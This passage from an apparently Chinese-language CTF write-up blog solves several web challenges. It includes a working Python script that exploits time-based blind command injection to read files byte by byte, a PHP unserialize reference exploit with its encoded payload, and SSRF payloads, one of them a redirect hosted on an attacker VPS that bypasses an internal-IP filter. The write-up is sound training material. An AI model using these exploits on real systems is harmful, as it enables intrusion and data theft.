改成靶机真实URL（含脚本路径）</span></span><br><span class="line">PARAM  = <span class="string">&quot;dir&quot;</span></span><br><span class="line">DELAY  = <span class="number">1.8</span>        <span class="comment"># 真假分离睡眠秒数：网络噪声大就调大一点（如 2.2）</span></span><br><span class="line">THRESH = <span class="number">1.0</span>        <span class="comment"># 判真阈值：响应耗时 &gt; THRESH 视为条件为真</span></span><br><span class="line">TIMEOUT = <span class="number">8</span></span><br><span class="line">HEADERS = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ctf-cmdi-blind&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要盲取的“命令标准输出”——这里是 ls /，为了稳定起见用单列输出并固定locale</span></span><br><span class="line"><span class="comment"># CMD = r&quot;LC_ALL=C ls -1 /flag&quot;</span></span><br><span class="line">CMD = <span class="string">r&quot;LC_ALL=C cat /flag/this_xxxx_flag_899999999&quot;</span></span><br><span class="line"><span class="comment"># =================================================</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hit</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发起一次带注入的GET请求，返回响应耗时（秒）&quot;&quot;&quot;</span></span><br><span class="line">    params = &#123;PARAM: <span class="string">f&quot;.; <span class="subst">&#123;payload&#125;</span>&quot;</span>&#125;</span><br><span class="line">    t0 = time.perf_counter()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = sess.get(TARGET, params=params, headers=HEADERS, timeout=TIMEOUT)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="comment"># 遇到网络错误也返回个大值，以防误判</span></span><br><span class="line">        <span class="keyword">return</span> THRESH + DELAY + <span class="number">0.9</span></span><br><span class="line">    <span class="keyword">return</span> time.perf_counter() - t0</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_true</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;条件为真则 sleep DELAY 的探针&quot;&quot;&quot;</span></span><br><span class="line">    dt = hit(<span class="string">f&quot;<span class="subst">&#123;cmd&#125;</span> &amp;&amp; sleep <span class="subst">&#123;DELAY&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> dt &gt; THRESH</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">have_tool</span>(<span class="params">name: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;探测远端是否有某个命令（通过 which，盲注时序判断）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># [ -x &quot;$(command -v od)&quot; ]</span></span><br><span class="line">    <span class="keyword">return</span> is_true(<span class="string">f&quot;[ -x \&quot;$(command -v <span class="subst">&#123;name&#125;</span>)\&quot; ]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stdout_len</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;二分获取命令标准输出的字节长度： (cmd | wc -c)&quot;&quot;&quot;</span></span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_true(<span class="string">f&quot;[ $(<span class="subst">&#123;cmd&#125;</span> | wc -c) -ge <span class="subst">&#123;hi&#125;</span> ]&quot;</span>):</span><br><span class="line">            lo, hi = hi, hi * <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> lo + <span class="number">1</span> &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> is_true(<span class="string">f&quot;[ $(<span class="subst">&#123;cmd&#125;</span> | wc -c) -ge <span class="subst">&#123;mid&#125;</span> ]&quot;</span>):</span><br><span class="line">            lo = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">return</span> lo</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_at</span>(<span class="params">pos: <span class="built_in">int</span>, cmd: <span class="built_in">str</span>, use_od=<span class="literal">True</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    取命令输出第 pos(1-based) 个字节的十进制值（0..255），二分比较。</span></span><br><span class="line"><span class="string">    优先 dd+od；若无 od，则用 hexdump 兜底。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> use_od:</span><br><span class="line">        <span class="comment"># c=$(cmd | dd bs=1 count=1 skip=POS-1 2&gt;/dev/null | od -An -tu1)</span></span><br><span class="line">        extractor_tmpl = (</span><br><span class="line">            <span class="string">f&quot;c=$(<span class="subst">&#123;cmd&#125;</span> | dd bs=1 count=1 skip=$((<span class="subst">&#123;pos&#125;</span>-1)) 2&gt;/dev/null | od -An -tu1); &quot;</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># c=$(cmd | dd ... | hexdump -v -e &#x27;1/1 &quot;%u&quot;&#x27;)</span></span><br><span class="line">        extractor_tmpl = (</span><br><span class="line">            <span class="string">f&quot;c=$(<span class="subst">&#123;cmd&#125;</span> | dd bs=1 count=1 skip=$((<span class="subst">&#123;pos&#125;</span>-1)) 2&gt;/dev/null | &quot;</span></span><br><span class="line">            <span class="string">&quot;hexdump -v -e &#x27;1/1 \&quot;%u\&quot;&#x27;); &quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">256</span></span><br><span class="line">    <span class="keyword">while</span> lo + <span class="number">1</span> &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># [ &quot;$&#123;c:-0&#125;&quot; -ge mid ]</span></span><br><span class="line">        probe = extractor_tmpl + <span class="string">f&quot;[ \&quot;$&#123;&#123;c:-0&#125;&#125;\&quot; -ge <span class="subst">&#123;mid&#125;</span> ]&quot;</span></span><br><span class="line">        <span class="keyword">if</span> is_true(probe):</span><br><span class="line">            lo = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">return</span> lo</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_cmd_stdout</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Probing tools on target...&quot;</span>)</span><br><span class="line">    od_ok = have_tool(<span class="string">&quot;od&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> od_ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] &#x27;od&#x27; not found, will try &#x27;hexdump&#x27; fallback.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> have_tool(<span class="string">&quot;hexdump&quot;</span>):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Neither &#x27;od&#x27; nor &#x27;hexdump&#x27; is available on target.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] &#x27;od&#x27; is available.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Measuring baseline timings ...&quot;</span>)</span><br><span class="line">    t_true  = hit(<span class="string">f&quot;true &amp;&amp; sleep <span class="subst">&#123;DELAY&#125;</span>&quot;</span>)</span><br><span class="line">    t_false = hit(<span class="string">&quot;false &amp;&amp; sleep 0&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;    true-delay ≈ <span class="subst">&#123;t_true:<span class="number">.3</span>f&#125;</span>s, no-delay ≈ <span class="subst">&#123;t_false:<span class="number">.3</span>f&#125;</span>s (THRESH=<span class="subst">&#123;THRESH&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Getting stdout length ...&quot;</span>)</span><br><span class="line">    n = stdout_len(cmd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Output length = <span class="subst">&#123;n&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        b = byte_at(i, cmd, use_od=od_ok)</span><br><span class="line">        out.append(b)</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">10</span> == <span class="number">0</span> <span class="keyword">or</span> i == n:</span><br><span class="line">            tail = out[-<span class="number">40</span>:].decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] pos <span class="subst">&#123;i:&gt;<span class="number">4</span>&#125;</span>/<span class="subst">&#123;n&#125;</span>: <span class="subst">&#123;b:3d&#125;</span>  | tail: <span class="subst">&#123;tail&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Target: <span class="subst">&#123;TARGET&#125;</span>&quot;</span>)</span><br><span class="line">    data = dump_cmd_stdout(CMD)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n===== ls / (raw) =====\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(data.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{c6a5fed41815eac3264536fbb7f3a09d}</p>
</blockquote>
<h2 id="php-unserialize1"><a href="#php-unserialize1" class="headerlink" title="php - unserialize1"></a>php - unserialize1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unserialize1</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$input</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$pass</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>) &#123;</span><br><span class="line">  <span class="variable">$o</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;input) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$o</span>-&gt;secret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一眼引用</p>
<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unserialize1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$input</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserialize1</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; input = &amp;<span class="variable">$a</span>-&gt;secret;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pass=O%3A12%3A%22unserialize1%22%3A2%3A%7Bs%3A5%3A%22input%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A2%3B%7D</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{a006128ed1d37747325d151e64735c3d}</p>
</blockquote>
<h2 id="ssrf-warmup"><a href="#ssrf-warmup" class="headerlink" title="ssrf - warmup"></a>ssrf - warmup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$url</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/file/flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{7c431f276f425b3d805e67849bcfab98}</p>
</blockquote>
<h2 id="ssrf-bypass-1"><a href="#ssrf-bypass-1" class="headerlink" title="ssrf - bypass - 1"></a>ssrf - bypass - 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isInternalIp</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="variable">$net_a</span> = <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.255.255.255&#x27;</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    <span class="variable">$net_b</span> = <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.31.255.255&#x27;</span>) &gt;&gt; <span class="number">20</span>;</span><br><span class="line">    <span class="variable">$net_c</span> = <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.255.255&#x27;</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    <span class="variable">$net_l</span> = <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.255.255.255&#x27;</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ip</span> &gt;&gt; <span class="number">24</span> === <span class="variable">$net_a</span> || <span class="variable">$ip</span> &gt;&gt; <span class="number">20</span> === <span class="variable">$net_b</span> || <span class="variable">$ip</span> &gt;&gt; <span class="number">16</span> === <span class="variable">$net_c</span> || <span class="variable">$ip</span> &gt;&gt; <span class="number">24</span> === <span class="variable">$net_l</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;post data error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$data</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;http&quot;</span> !== <span class="title function_ invoke__">strtolower</span>(<span class="variable">$info</span>[<span class="string">&quot;scheme&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([2][0-4]\d|[2][5][0-5]|[1]\d\d|[1-9][\d]|[\d])(\.([2][0-4]\d|[2][5][0-5]|[1]\d\d|[1-9][\d]|[\d]))&#123;3&#125;/&#x27;</span>,<span class="variable">$info</span>[<span class="string">&quot;host&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$info</span>[<span class="string">&quot;host&quot;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$info</span>[<span class="string">&quot;host&quot;</span>]);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">isInternalIp</span>(<span class="variable">$ip</span>))&#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&quot;method&quot;</span>] == <span class="string">&#x27;POST&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$post</span> = <span class="variable">$data</span>[<span class="string">&quot;post&quot;</span>];</span><br><span class="line">    <span class="variable">$post</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;urldecode&quot;</span>, <span class="variable">$post</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$post</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<p>waf作用流程：</p>
<ol>
<li>强制要求使用HTTP协议</li>
<li>检查主机名是否是IPv4格式。若不是IP，则通过DNS解析获取IP。</li>
<li>使用isInternalIp()检测是否为内网IP，是则拒绝访问。</li>
</ol>
<p>漏洞点：重定向绕过内网限制<br>代码启用了CURLOPT_FOLLOWLOCATION（跟随重定向）。<br>内网IP检查仅在初始URL解析时进行，重定向后的URL不再检查。</p>
<p>因此首先在vps上放一个1.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后post传如下payload即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;: &quot;http://vps/1.php&quot;&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{bd2e035f9b57a7b303fb09c74beb40cd}</p>
</blockquote>
<h2 id="ssrf-bypass-2"><a href="#ssrf-bypass-2" class="headerlink" title="ssrf - bypass - 2"></a>ssrf - bypass - 2</h2><p>代码同上题，但是上题payload打过去有如下回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0ops&#123;bd2e035f9b57a7b303fb09c74beb40cd&#125;</span><br><span class="line">$_POST[&#x27;secret&#x27;] should be &#x27;this_is_a_secret&#x27;.</span><br><span class="line">can not get second flag.</span><br></pre></td></tr></table></figure>

<h2 id="ssrf-bypass-3"><a href="#ssrf-bypass-3" class="headerlink" title="ssrf - bypass - 3"></a>ssrf - bypass - 3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;post data error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$data</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;http&quot;</span> !== <span class="title function_ invoke__">strtolower</span>(<span class="variable">$info</span>[<span class="string">&quot;scheme&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&quot;method&quot;</span>] == <span class="string">&#x27;POST&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$post</span> = <span class="variable">$data</span>[<span class="string">&quot;post&quot;</span>];</span><br><span class="line">    <span class="variable">$post</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&quot;urldecode&quot;</span>, <span class="variable">$post</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$post</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span 